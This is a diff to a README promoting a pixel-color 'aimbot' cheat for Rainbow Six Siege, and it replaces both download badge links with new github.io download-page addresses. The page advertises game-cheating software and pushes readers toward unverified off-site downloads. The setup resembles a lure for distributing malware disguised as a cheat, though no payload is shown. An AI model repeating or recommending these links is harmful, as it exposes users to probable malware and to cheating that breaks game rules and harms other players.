@@ -1,7 +1,7 @@
 # 🎯 asdfWARE Pixel Aimbot for Rainbow Six Siege — Smart Color-Based Aim Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-darkorange?style=for-the-badge)](https://download-portal-demo.github.io/.github/Pixel1)  
-[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=rainbow-six-siege)](https://download-portal-demo.github.io/.github/asdWaree)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-darkorange?style=for-the-badge)](https://trahendon.github.io/.github/PixelasdWare4Pc)  
+[![Download Now](https://img.shields.io/badge/Download_Now-darkblue?style=for-the-badge&logo=rainbow-six-siege)](https://trahendon.github.io/.github/PixelasdWare4Pc)
 
 ---
 
